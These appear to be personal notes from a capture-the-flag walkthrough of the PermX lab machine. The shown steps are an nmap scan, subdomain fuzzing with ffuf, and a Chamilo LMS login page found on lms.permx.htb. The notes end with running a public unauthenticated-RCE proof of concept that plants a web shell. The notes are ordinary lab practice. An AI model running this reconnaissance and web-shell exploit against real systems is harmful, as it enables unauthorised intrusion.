#### nmap

Service scan
```bash
sudo nmap -sC -sV 10.10.11.23 -oA nmap -v
```
![[Pasted image 20241017105130.png]]

All port scan


#### manual

- Added permx.htb to /etc/hosts
- 

![[Pasted image 20241017105321.png]]

Performed a scan to enumerate subdomains
```bash
ffuf -u http://permx.htb -H "Host: FUZZ.permx.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 302
```
![[Pasted image 20241017110125.png]]

- Going over to the website after adding lms.permx.htb to /etc/hosts shows its a Chamilo log in page
![[Pasted image 20241017110207.png]]
Found an unauthenticated RCE on [GitHub](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc) 
```bash
python3 main.py -u http://lms.permx.htb -a webshell
```
![[Pasted image 20241017110542.png]]
![[Pasted image 20241017110558.png]]
